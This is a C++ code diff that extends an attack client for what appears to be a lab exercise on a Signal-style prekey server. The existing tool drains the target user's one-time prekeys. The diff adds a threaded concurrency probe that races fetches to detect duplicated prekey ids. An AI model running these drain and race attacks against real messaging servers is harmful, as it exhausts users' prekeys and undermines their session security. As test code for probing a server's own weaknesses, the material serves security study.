@@ -26,6 +26,10 @@
 #include <cctype>
 #include <cerrno>
 #include <string>
+#include <vector>
+#include <thread>
+#include <atomic>
+#include <algorithm>
 
 #include <netdb.h>
 #include <unistd.h>
@@ -44,6 +48,7 @@ static std::string g_target   = "bob";      // whose OPKs we drain
 static std::string g_user     = "mallory";  // username Mallory registers as
 static bool        g_register = true;       // --no-register to skip register
 static long        g_count    = -1;         // max fetches; -1 = until drained
+static int         g_concurrent = 0;        // >0: fire K simultaneous fetches (A.3 probe)
 static std::string g_server   = cfg::SERVER_ADDR;
 static int         g_port     = cfg::SERVER_PORT;
 
@@ -208,6 +213,77 @@ static long drain(Conn& c, const std::string& target, long cap) {
     return pulled;
 }
 
+// ---------------------------------------------------------------------------
+// Concurrency probe (spec A.3): open K independent connections, then have all K
+// fire a SINGLE fetch_bundle at the same instant. If the server's allocation is
+// not atomic, two racing requests may be handed the SAME opk_id — meaning two
+// different initiators would derive a session against one one-time prekey,
+// breaking its "one-time" guarantee. We synchronise on a spin flag to make the
+// fetches land as close together as possible, then report any duplicate ids.
+// ---------------------------------------------------------------------------
+static void probe_concurrent(const std::string& target, int k) {
+    std::printf("[attack1] concurrency probe: %d simultaneous fetches for '%s'\n",
+                k, target.c_str());
+
+    std::vector<Conn>        conns(k);
+    std::vector<long>        ids(k, -2);     // -2 = not run, -1 = err/absent
+    std::vector<std::string> notes(k);
+
+    // Pre-connect (and register, unless --no-register) so only the fetch races.
+    int ready = 0;
+    for (int i = 0; i < k; ++i) {
+        conns[i].fd = dial_server(g_server, g_port);
+        if (conns[i].fd < 0) { notes[i] = "connect failed"; continue; }
+        if (g_register) {
+            std::string reg = "{\"type\":\"register\",\"user\":\"" + g_user +
+                              std::to_string(i) + "\"}";
+            std::string resp;
+            if (!conn_writeline(conns[i], reg) || !conn_readline(conns[i], resp)) {
+                notes[i] = "register failed";
+                close(conns[i].fd); conns[i].fd = -1; continue;
+            }
+        }
+        ++ready;
+    }
+    std::printf("[attack1] %d/%d connections ready\n", ready, k);
+
+    std::atomic<bool> go(false);
+    std::vector<std::thread> workers;
+    for (int i = 0; i < k; ++i) {
+        if (conns[i].fd < 0) continue;
+        workers.emplace_back([&, i]() {
+            while (!go.load(std::memory_order_acquire)) { /* spin until released */ }
+            FetchResult r = do_fetch(conns[i], target, i + 1);
+            ids[i] = (r.outcome == Outcome::GOT_BUNDLE) ? r.opk_id : -1;
+            if (r.outcome == Outcome::EMPTY) notes[i] = "empty";
+        });
+    }
+    go.store(true, std::memory_order_release);  // release all at once
+    for (auto& t : workers) t.join();
+    for (int i = 0; i < k; ++i) if (conns[i].fd >= 0) close(conns[i].fd);
+
+    // Tally handed-out ids and flag any served to more than one request.
+    std::vector<long> got;
+    for (int i = 0; i < k; ++i) if (ids[i] >= 0) got.push_back(ids[i]);
+    std::sort(got.begin(), got.end());
+
+    std::printf("[attack1] ids handed out: ");
+    for (long v : got) std::printf("%ld ", v);
+    std::printf("\n");
+
+    bool dup = false;
+    for (size_t i = 1; i < got.size(); ++i) {
+        if (got[i] == got[i - 1]) {
+            std::printf("[attack1] *** DUPLICATE opk_id=%ld served to >1 request "
+                        "(non-atomic allocation!)\n", got[i]);
+            dup = true;
+        }
+    }
+    if (!dup)
+        std::printf("[attack1] no duplicate ids — allocation looks atomic for this run\n");
+    std::printf("[attack1] (re-run a few times; a race may only show intermittently)\n");
+}
+
 int main(int argc, char** argv) {
     for (int i = 1; i < argc; ++i) {
         if (std::strcmp(argv[i], "--target") == 0 && i + 1 < argc)
@@ -218,17 +294,28 @@ int main(int argc, char** argv) {
             g_register = false;
         else if (std::strcmp(argv[i], "--count") == 0 && i + 1 < argc)
             g_count = std::atol(argv[++i]);
+        else if (std::strcmp(argv[i], "--concurrent") == 0 && i + 1 < argc)
+            g_concurrent = std::atoi(argv[++i]);
         else if (std::strcmp(argv[i], "--server") == 0 && i + 1 < argc)
             g_server = argv[++i];
         else if (std::strcmp(argv[i], "--port") == 0 && i + 1 < argc)
             g_port = std::atoi(argv[++i]);
     }
 
-    std::printf("[attack1] Prekey Pogo (Step 2: drain loop)\n");
+    const char* mode = g_concurrent > 0 ? "Step 3: concurrency probe"
+                                        : "Step 2: drain loop";
+    std::printf("[attack1] Prekey Pogo (%s)\n", mode);
     std::printf("[attack1] server %s:%d  target '%s'  as '%s'  cap %s\n",
                 g_server.c_str(), g_port, g_target.c_str(),
                 g_register ? g_user.c_str() : "(unregistered)",
                 g_count < 0 ? "until-drained" : std::to_string(g_count).c_str());
+
+    // Step 3: concurrency probe owns its own K connections — run and exit.
+    if (g_concurrent > 0) {
+        probe_concurrent(g_target, g_concurrent);
+        std::printf("[attack1] done.\n");
+        return 0;
+    }
 
     Conn c;
     c.fd = dial_server(g_server, g_port);
